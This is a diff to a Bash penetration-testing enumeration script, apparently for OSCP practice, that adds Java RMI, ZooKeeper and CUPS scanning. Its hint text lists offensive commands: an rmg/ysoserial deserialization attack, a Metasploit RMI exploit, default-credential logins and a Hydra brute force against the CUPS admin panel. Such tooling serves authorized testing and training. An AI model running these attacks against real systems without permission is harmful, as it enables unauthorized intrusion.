@@ -42,7 +42,7 @@ has_udp_port() {
 # ---------------------------------------------------------------------------
 # Argument parsing
 # ---------------------------------------------------------------------------
-TARGET=""; OUTPUT_DIR=""; PORTS=""; UDP_PORTS=""; DOMAIN=""
+TARGET=""; OUTPUT_DIR=""; PORTS=""; UDP_PORTS=""; DOMAIN=""; RMI_PORTS=""
 
 while [[ $# -gt 0 ]]; do
     case "$1" in
@@ -51,6 +51,7 @@ while [[ $# -gt 0 ]]; do
         --ports)      PORTS="$2";      shift 2 ;;
         --udp-ports)  UDP_PORTS="$2";  shift 2 ;;
         --domain)     DOMAIN="$2";     shift 2 ;;
+        --rmi-ports)  RMI_PORTS="$2";  shift 2 ;;
         *) err "Unknown argument: $1"; exit 1 ;;
     esac
 done
@@ -983,36 +984,165 @@ for IRC_PORT in 6667 6697; do
 done
 
 # ===========================================================================
-# Java RMI Registry — port 1099
+# Java RMI Registry — port 1099 + any high ports detected as java-rmi
+# (modules/services.py passes --rmi-ports with all ports whose Nmap service
+# matched "rmi"/"rmiregistry", including non-standard high ports).
 # ===========================================================================
-if has_port 1099; then
+RMI_PORT_LIST=""
+has_port 1099 && RMI_PORT_LIST="1099"
+if [[ -n "$RMI_PORTS" ]]; then
+    RMI_PORT_LIST="$(echo "${RMI_PORT_LIST},${RMI_PORTS}" \
+        | tr ',' '\n' | grep -E '^[0-9]+$' | sort -un | paste -sd, -)"
+fi
+
+if [[ -n "$RMI_PORT_LIST" ]]; then
     RMI_DIR="${OUTPUT_DIR}/rmi"
     mkdir -p "$RMI_DIR"
-    info "[RMI] Java RMI Registry enumeration on port 1099"
+    info "[RMI] Java RMI enumeration on ports: ${RMI_PORT_LIST}"
 
-    # Nmap RMI scripts
-    cmd "nmap -p1099 --script rmi-dumpregistry,rmi-vuln-classloader -Pn ${TARGET}"
-    nmap -p1099 --script rmi-dumpregistry,rmi-vuln-classloader \
-        --script-timeout 30s -Pn "$TARGET" \
-        -oN "${RMI_DIR}/rmi_nmap.txt" 2>&1 | tee "${RMI_DIR}/rmi_nmap.txt" || true
-    ok "RMI nmap scan -> ${WHITE}${RMI_DIR}/rmi_nmap.txt${NC}"
+    for RMI_P in $(echo "$RMI_PORT_LIST" | tr ',' ' '); do
+        RMI_OUT="${RMI_DIR}/rmi_nmap_port${RMI_P}.txt"
+        cmd "nmap -p${RMI_P} --script rmi-dumpregistry,rmi-vuln-classloader -Pn ${TARGET}"
+        nmap -p"$RMI_P" --script rmi-dumpregistry,rmi-vuln-classloader \
+            --script-timeout 30s -Pn "$TARGET" \
+            -oN "$RMI_OUT" 2>&1 | tee "$RMI_OUT" || true
+        ok "RMI nmap scan port ${RMI_P} -> ${WHITE}${RMI_OUT}${NC}"
 
-    # Check if classloader vuln detected
-    if grep -qi 'VULNERABLE\|classloader' "${RMI_DIR}/rmi_nmap.txt" 2>/dev/null; then
-        warn "Java RMI classloader vulnerability detected — potential RCE!"
-    fi || true
+        if grep -qi 'VULNERABLE\|classloader' "$RMI_OUT" 2>/dev/null; then
+            warn "Java RMI classloader vulnerability detected on port ${RMI_P} — potential RCE!"
+        fi
 
-    hint "Java RMI exploitation:
-    # Enumerate bound objects:
-    rmg enum ${TARGET} 1099
-    # List all bound names:
-    rmg list ${TARGET} 1099
-    # Test deserialization (requires ysoserial) — OSCP-safe manual path:
-    rmg serial ${TARGET} 1099 CommonsCollections6 'id' --bound-name <name>
-    # ⚠️ OSCP: Metasploit limited to 1 machine per exam
-    # [MSF-RESTRICTED] Metasploit alternative:
-    # use exploit/multi/misc/java_rmi_server
-    # set RHOSTS ${TARGET}; run"
+        hint "Java RMI exploitation (port ${RMI_P}):
+        # Enumerate bound objects:
+        rmg enum ${TARGET} ${RMI_P}
+        # List all bound names:
+        rmg list ${TARGET} ${RMI_P}
+        # Test deserialization (requires ysoserial) — OSCP-safe manual path:
+        rmg serial ${TARGET} ${RMI_P} CommonsCollections6 'id' --bound-name <name>
+        # ⚠️ OSCP: Metasploit limited to 1 machine per exam
+        # [MSF-RESTRICTED] Metasploit alternative:
+        # use exploit/multi/misc/java_rmi_server
+        # set RHOSTS ${TARGET}; set RPORT ${RMI_P}; run"
+    done
+    echo ""
+fi
+
+# ===========================================================================
+# ZooKeeper — port 2181
+# Uses 4-letter-word (4lw) commands over raw TCP. ZK 3.5+ restricts these
+# by default (4lw.commands.whitelist) so empty output is expected on hardened
+# deployments — the script handles it silently.
+# ===========================================================================
+if has_port 2181; then
+    ZK_DIR="${OUTPUT_DIR}/zookeeper"
+    mkdir -p "$ZK_DIR"
+    info "[ZK] ZooKeeper enumeration on port 2181"
+
+    ZK_NMAP="${ZK_DIR}/zookeeper_nmap.txt"
+    cmd "nmap -p2181 --script zookeeper-info -Pn ${TARGET}"
+    nmap -p2181 --script zookeeper-info --script-timeout 30s -Pn "$TARGET" \
+        -oN "$ZK_NMAP" 2>&1 | tee "$ZK_NMAP" || true
+    ok "ZK nmap scan -> ${WHITE}${ZK_NMAP}${NC}"
+
+    ZK_GOT_DATA=false
+    for FLW in stat envi dump mntr conf ruok; do
+        ZK_FLW_OUT="${ZK_DIR}/zk_${FLW}.txt"
+        cmd "echo ${FLW} | nc -w 3 ${TARGET} 2181"
+        (echo "$FLW" | timeout 5 nc -w 3 "$TARGET" 2181 > "$ZK_FLW_OUT" 2>&1) || true
+        if [[ -s "$ZK_FLW_OUT" ]] && ! grep -qi 'not in the whitelist\|is not executed' "$ZK_FLW_OUT"; then
+            ZK_GOT_DATA=true
+        fi
+    done
+
+    if [[ "$ZK_GOT_DATA" == "true" ]]; then
+        ok "ZooKeeper 4lw commands responding → ${WHITE}${ZK_DIR}/${NC}"
+        # Surface interesting fields from stat/envi
+        if [[ -s "${ZK_DIR}/zk_stat.txt" ]]; then
+            ZK_VER=$(grep -i '^Zookeeper version' "${ZK_DIR}/zk_stat.txt" 2>/dev/null | head -1 || true)
+            [[ -n "$ZK_VER" ]] && warn "ZK version banner: ${ZK_VER}"
+        fi
+    else
+        info "ZooKeeper 4lw commands restricted or no response (ZK 3.5+ default)."
+    fi
+
+    hint "ZooKeeper manual:
+    # Interactive client (list nodes, dump data):
+    zkCli.sh -server ${TARGET}:2181
+    zkCli.sh> ls /
+    zkCli.sh> get /<path>
+    # Python alternative (kazoo):
+    python3 -c 'from kazoo.client import KazooClient; z=KazooClient(\"${TARGET}:2181\"); z.start(); print(z.get_children(\"/\"))'
+    # If Apache Exhibitor dashboard is exposed via HTTP (typical sidecar):
+    curl -s http://${TARGET}:8080/exhibitor/v1/ui/index.html
+    curl -s http://${TARGET}:8080/exhibitor/v1/cluster/state
+    # Look for creds / config in ZK nodes — znodes often store app secrets."
+    echo ""
+fi
+
+# ===========================================================================
+# CUPS / IPP — port 631
+# Probe common admin endpoints. A 401 on /admin/ is NOT a 'no-op' — it
+# confirms the panel exists and is a valid brute-force / default-creds target.
+# ===========================================================================
+if has_port 631; then
+    CUPS_DIR="${OUTPUT_DIR}/cups"
+    mkdir -p "$CUPS_DIR"
+    info "[CUPS] CUPS / IPP enumeration on port 631"
+
+    CUPS_NMAP="${CUPS_DIR}/cups_nmap.txt"
+    cmd "nmap -p631 --script cups-info,cups-queue-info -Pn ${TARGET}"
+    nmap -p631 --script cups-info,cups-queue-info --script-timeout 30s -Pn "$TARGET" \
+        -oN "$CUPS_NMAP" 2>&1 | tee "$CUPS_NMAP" || true
+    ok "CUPS nmap scan -> ${WHITE}${CUPS_NMAP}${NC}"
+
+    CUPS_ADMIN_STATUS=""
+    for EP in / /printers/ /classes/ /jobs/ /admin/; do
+        SAFE_EP=$(echo "$EP" | tr '/' '_')
+        CUPS_EP_OUT="${CUPS_DIR}/cups${SAFE_EP}.html"
+        CUPS_STATUS=$(curl -sk -o "$CUPS_EP_OUT" -w "%{http_code}" --max-time 8 \
+            "http://${TARGET}:631${EP}" 2>/dev/null || echo "000")
+        cmd "curl -sk --max-time 8 http://${TARGET}:631${EP} [HTTP ${CUPS_STATUS}]"
+        if [[ "$EP" == "/admin/" ]]; then
+            CUPS_ADMIN_STATUS="$CUPS_STATUS"
+        fi
+        case "$CUPS_STATUS" in
+            200) ok "CUPS ${EP} → 200 OK — ${WHITE}${CUPS_EP_OUT}${NC}" ;;
+            401) warn "CUPS ${EP} → 401 (auth required — panel exists, BF candidate)" ;;
+            403) info "CUPS ${EP} → 403 (forbidden)" ;;
+            *)   info "CUPS ${EP} → ${CUPS_STATUS}" ;;
+        esac
+    done
+
+    # CUPS version for CVE lookup
+    CUPS_VER=$(grep -iE '^Server:\s*CUPS' "${CUPS_DIR}/cups_.html" 2>/dev/null \
+        | head -1 | grep -oE 'CUPS/[0-9.]+' || true)
+    [[ -n "$CUPS_VER" ]] && warn "CUPS server banner: ${CUPS_VER}"
+
+    # /admin/ on 401 is a valid finding — panel exists, try default creds / BF
+    if [[ "$CUPS_ADMIN_STATUS" == "401" ]]; then
+        hint "CUPS admin panel (401) — default-creds / brute-force candidate:
+        # Try default creds manually first:
+        curl -sk -u admin:admin       http://${TARGET}:631/admin/ | head
+        curl -sk -u admin:            http://${TARGET}:631/admin/ | head
+        curl -sk -u root:root         http://${TARGET}:631/admin/ | head
+        # Hydra brute-force (OSCP-safe — http-get basic auth):
+        hydra -l admin -P /usr/share/wordlists/rockyou.txt -f ${TARGET} http-get /admin/:F=401 -t 4
+        # CVE research (cups-browsed RCE 2024):
+        searchsploit cups 2024
+        searchsploit cups ${CUPS_VER}"
+    elif [[ "$CUPS_ADMIN_STATUS" == "200" ]]; then
+        warn "CUPS /admin/ → 200 (unauthenticated admin panel exposed!)"
+        hint "CUPS unauthenticated admin panel — immediate review:
+        curl -sk http://${TARGET}:631/admin/
+        # Add/delete printers, change config — potential RCE via filter abuse.
+        searchsploit cups"
+    else
+        hint "CUPS manual:
+        curl -s http://${TARGET}:631/printers/
+        curl -s http://${TARGET}:631/classes/
+        # CVE-2024-47176 CUPS / cups-browsed RCE chain:
+        searchsploit cups 2024"
+    fi
     echo ""
 fi
 
